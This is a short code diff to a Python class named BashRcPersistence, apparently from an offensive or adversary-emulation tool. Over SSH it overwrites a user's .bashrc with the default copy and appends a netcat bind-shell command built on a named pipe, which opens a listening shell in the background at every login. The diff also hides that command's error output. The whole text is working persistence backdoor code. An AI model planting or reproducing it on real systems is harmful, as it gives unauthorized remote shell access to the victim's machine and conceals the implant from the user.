@@ -15,8 +15,11 @@ class BashRcPersistence(BasePersistence):
             if not ssh_shell.create_connection():
                 return False
 
+            command = "cp -f /etc/skel/.bashrc /home/{}/.bashrc".format(self._user.username)
+            ssh_shell.send_command(command)
+
             command = "echo \"NC=\`which nc\` && mknod /tmp/backpipe p 2>/dev/null; " \
-                      "/bin/sh 0</tmp/backpipe | \$NC -lp {} 1>/tmp/backpipe &disown\" " \
+                      "/bin/sh 0</tmp/backpipe | \$NC -lp {} 1>/tmp/backpipe 2>/dev/null &disown\" " \
                       ">> /home/{}/.bashrc".format(self._listen_port, self._user.username)
             ssh_shell.send_command(command)
 
